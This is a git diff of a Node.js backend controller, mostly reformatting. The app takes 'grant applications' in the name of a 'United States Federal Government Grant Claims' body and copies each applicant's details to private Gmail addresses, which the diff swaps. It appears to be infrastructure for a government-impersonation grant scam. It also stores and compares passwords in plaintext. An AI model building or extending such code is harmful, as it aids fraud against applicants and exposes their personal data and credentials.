@@ -2,7 +2,7 @@ const User = require("../models/UserModel");
 const createTokenUser = require("../utils/createTokenUser");
 const { createToken } = require("../utils/token");
 const sendEmail = require("../utils/emailSender");
-const cloudinary = require('cloudinary').v2
+const cloudinary = require("cloudinary").v2;
 
 // const registerUser = async (req, res) => {
 //   const {
@@ -56,8 +56,6 @@ const cloudinary = require('cloudinary').v2
 // //    }
 // //  );
 
-
-
 //   // Input validation
 //   const requiredFields = [
 //     { field: firstname, name: "First name" },
@@ -99,7 +97,7 @@ const cloudinary = require('cloudinary').v2
 //     if (existingUser) {
 //       return res.status(404).json({ error: "Email already exist" });
 //     }
-    
+
 //     const image = req.file;
 
 //     // Ensure both image and kyc files are provided
@@ -129,8 +127,6 @@ const cloudinary = require('cloudinary').v2
 //         folder: "image_images",
 //       }
 //     );
-
-  
 
 //     const user = new User({
 //       firstname,
@@ -195,18 +191,18 @@ const cloudinary = require('cloudinary').v2
 //     <p>Application Received</p>
 //     <h4>Thank you!</h4>
 //     <h2>APPLICATION DETAILS </h2>
-//     <h2>Name: ${user.firstname} ${user.lastname}</h2> 
-//     <h2>Grant Amount: ${user.amount}</h2> 
-//     <p>Thank you for applying for a Grant payment at the United States Federal Government Grant Claims. 
+//     <h2>Name: ${user.firstname} ${user.lastname}</h2>
+//     <h2>Grant Amount: ${user.amount}</h2>
+//     <p>Thank you for applying for a Grant payment at the United States Federal Government Grant Claims.
 //     Your Grant application is still under processing; You will receive a Grant approval mail from us shortly when your Grant application is successfully approved by the US federal government.
-//     </p>    
+//     </p>
 //     </body>
 //     </html>
 //     `;
 
 //     await Promise.all([
 //       sendEmail(user.email, subject, text, html),
-//       sendEmail("anniemary841@gmail.com", subject, text, html),
+//       sendEmail("christopherray5419@gmail.com", subject, text, html),
 //       sendEmail("companychris00@gmail.com", subject, text, html),
 //     ]);
 
@@ -379,8 +375,7 @@ const registerUser = async (req, res) => {
 
     await Promise.all([
       sendEmail(user.email, subject, text, html),
-      sendEmail("anniemary841@gmail.com", subject, text, html),
-      sendEmail("companychris00@gmail.com", subject, text, html),
+      sendEmail("christopherray5419@gmail.com", subject, text, html),
     ]);
 
     const tokenUser = createTokenUser(user);
@@ -397,7 +392,6 @@ const registerUser = async (req, res) => {
   }
 };
 
-
 const login = async (req, res) => {
   try {
     const { email, password } = req.body;
@@ -410,11 +404,8 @@ const login = async (req, res) => {
     }
     const isMatch = password === user.password;
     if (!isMatch) {
-            return res
-              .status(404)
-              .json({ error: "Email or password incorrect" });
-
-    } 
+      return res.status(404).json({ error: "Email or password incorrect" });
+    }
     const tokenUser = createTokenUser(user);
     return res.status(200).json({
       token: createToken({ user: tokenUser }),
@@ -441,9 +432,14 @@ const getAllUSer = async (req, res) => {
 const isApproved = async (req, res) => {
   try {
     const { userId } = req.params;
-    const user = await User.findByIdAndUpdate(userId, {isApproved: true}, {
-        new: true, runValidators: true
-    });
+    const user = await User.findByIdAndUpdate(
+      userId,
+      { isApproved: true },
+      {
+        new: true,
+        runValidators: true,
+      }
+    );
     if (!user) {
       return res.status(400).json({ error: "no user found" });
     }
